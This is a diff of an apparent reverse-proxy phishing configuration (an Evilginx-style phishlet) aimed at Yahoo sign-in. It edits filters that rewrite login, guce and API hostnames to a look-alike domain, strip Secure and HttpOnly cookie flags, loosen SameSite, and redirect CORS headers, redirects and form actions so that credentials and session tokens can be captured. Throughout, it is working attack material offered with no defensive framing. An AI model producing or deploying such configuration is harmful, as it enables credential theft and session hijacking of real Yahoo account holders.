@@ -8,28 +8,28 @@ proxy_hosts:
   - {phish_sub: 'sso.{{.Endpoint1}}', orig_sub: 'sso', domain: 'yahoo.com', session: true, auto_filter: true}
 sub_filters:
   # Replace login.yahoo.com references (HTTP/HTTPS, triggered from any Yahoo subdomain)
-  - {triggers_on: ['login.yahoo.com', 'guce.yahoo.com', 'api.login.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
-  - {triggers_on: ['login.yahoo.com', 'guce.yahoo.com', 'api.login.yahoo.com'], orig_sub: 'guce', domain: 'yahoo.com', search: 'guce.yahoo.com', replace: 'guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
-  - {triggers_on: ['login.yahoo.com', 'guce.yahoo.com', 'api.login.yahoo.com'], orig_sub: 'api.login', domain: 'yahoo.com', search: 'api.login.yahoo.com', replace: 'api.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
-  - {triggers_on: ['login.yahoo.com', 'guce.yahoo.com', 'api.login.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
-  - {triggers_on: ['login.yahoo.com', 'guce.yahoo.com', 'api.login.yahoo.com'], orig_sub: 'guce', domain: 'yahoo.com', search: 'https://guce.yahoo.com', replace: 'https://guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: '{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'guce.yahoo.com', replace: 'guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
+  - {triggers_on: 'api.login.yahoo.com', orig_sub: 'api.login', domain: 'yahoo.com', search: 'api.login.yahoo.com', replace: 'api.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
+  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'https://guce.yahoo.com', replace: 'https://guce.{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/x-javascript'], replace_all: true}
 
   # Cookie domain and security attribute replacements
-  - {triggers_on: ['login.yahoo.com', 'guce.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: '.yahoo.com', replace: '.{{.Domain}}', mimes: ['text/html', 'application/javascript'], headers: ['Set-Cookie', 'Cookie']}
-  - {triggers_on: ['login.yahoo.com', 'guce.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: 'Secure;', replace: '', mimes: ['text/html'], headers: ['Set-Cookie']}
-  - {triggers_on: ['login.yahoo.com', 'guce.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: 'SameSite=Lax', replace: 'SameSite=None', mimes: ['text/html'], headers: ['Set-Cookie']}
-  - {triggers_on: ['login.yahoo.com', 'guce.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: 'SameSite=Strict', replace: 'SameSite=None', mimes: ['text/html'], headers: ['Set-Cookie']}
-  - {triggers_on: ['login.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: 'HttpOnly;', replace: '', mimes: ['text/html'], headers: ['Set-Cookie']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '.yahoo.com', replace: '.{{.Domain}}', mimes: ['text/html', 'application/javascript'], headers: ['Set-Cookie', 'Cookie']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'Secure;', replace: '', mimes: ['text/html'], headers: ['Set-Cookie']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'SameSite=Lax', replace: 'SameSite=None', mimes: ['text/html'], headers: ['Set-Cookie']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'SameSite=Strict', replace: 'SameSite=None', mimes: ['text/html'], headers: ['Set-Cookie']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'HttpOnly;', replace: '', mimes: ['text/html'], headers: ['Set-Cookie']}
   
   # Redirects, CORS, and Form Handling
-  - {triggers_on: ['login.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'application/json'], headers: ['Location', 'Refresh']}
-  - {triggers_on: ['login.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: 'Access-Control-Allow-Origin: https://login.yahoo.com', replace: 'Access-Control-Allow-Origin: https://{{.Endpoint1}}.{{.Domain}}', headers: ['Access-Control-Allow-Origin']}
-  - {triggers_on: ['login.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: '"/', replace: '"https://{{.Endpoint1}}.{{.Domain}}/', mimes: ['text/html', 'application/javascript']}
-  - {triggers_on: ['login.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: 'action="https://login.yahoo.com', replace: 'action="https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'https://login.yahoo.com', replace: 'https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html', 'application/json'], headers: ['Location', 'Refresh']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'Access-Control-Allow-Origin: https://login.yahoo.com', replace: 'Access-Control-Allow-Origin: https://{{.Endpoint1}}.{{.Domain}}', headers: ['Access-Control-Allow-Origin']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '"/', replace: '"https://{{.Endpoint1}}.{{.Domain}}/', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'action="https://login.yahoo.com', replace: 'action="https://{{.Endpoint1}}.{{.Domain}}', mimes: ['text/html']}
 
   # Handle escaped dots in strings, common in JSON payloads or specific header-based redirections
-  - {triggers_on: ['login.yahoo.com', 'api.login.yahoo.com'], orig_sub: 'login', domain: 'yahoo.com', search: 'login\\.yahoo\\.com', replace: '{{.Endpoint1}}\\.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
-  - {triggers_on: ['login.yahoo.com', 'guce.yahoo.com'], orig_sub: 'guce', domain: 'yahoo.com', search: 'guce\\.yahoo\\.com', replace: 'guce.{{.Endpoint1}}\\.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login\\.yahoo\\.com', replace: '{{.Endpoint1}}\\.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
+  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'guce\\.yahoo\\.com', replace: 'guce.{{.Endpoint1}}\\.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json'], replace_all: true}
 
 auth_tokens:
   - domain: '.yahoo.com'
